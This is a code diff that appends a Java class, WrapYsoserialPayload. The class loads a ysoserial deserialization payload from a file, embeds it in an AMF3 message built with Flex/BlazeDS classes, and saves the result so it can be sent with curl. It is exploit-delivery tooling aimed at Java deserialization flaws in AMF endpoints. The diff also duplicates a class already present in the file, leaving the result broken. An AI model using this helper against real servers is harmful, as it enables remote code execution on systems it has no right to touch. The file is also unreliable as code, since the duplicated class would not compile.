@@ -267,3 +267,62 @@ public class WrapYsoserialPayload {
     }
 }
 
+
+
+
+import flex.messaging.io.SerializationContext;
+import flex.messaging.io.amf.ASObject;
+import flex.messaging.io.amf.Amf3Output;
+
+import java.io.ByteArrayOutputStream;
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.IOException;
+
+public class WrapYsoserialPayload {
+
+    public static void main(String[] args) {
+        try {
+            // Load the ysoserial payload
+            byte[] ysoserialPayload;
+            try (FileInputStream fis = new FileInputStream("ysoserial_payload.bin");
+                 ByteArrayOutputStream bos = new ByteArrayOutputStream()) {
+                byte[] buffer = new byte[1024];
+                int bytesRead;
+                while ((bytesRead = fis.read(buffer)) != -1) {
+                    bos.write(buffer, 0, bytesRead);
+                }
+                ysoserialPayload = bos.toByteArray();
+            }
+
+            // Create the AMF message
+            ASObject aso = new ASObject();
+            aso.put("operation", "echo");
+            aso.put("parameter", ysoserialPayload);  // Embed the ysoserial payload
+
+            // Create and initialize the SerializationContext
+            SerializationContext context = new SerializationContext();
+            context.createASObjectForMissingType = true; // Default value
+            context.supportDatesByReference = false;
+
+            // Serialize the AMF message
+            ByteArrayOutputStream baos = new ByteArrayOutputStream();
+            Amf3Output amf3Output = new Amf3Output(context);
+            amf3Output.setOutputStream(baos);
+            amf3Output.writeObject(aso);
+
+            byte[] amfMessage = baos.toByteArray();
+
+            // Save to a file for later use with curl
+            try (FileOutputStream fos = new FileOutputStream("simpleAmfMessage.bin")) {
+                fos.write(amfMessage);
+            }
+
+            System.out.println("AMF message serialized successfully to simpleAmfMessage.bin");
+
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+}
+
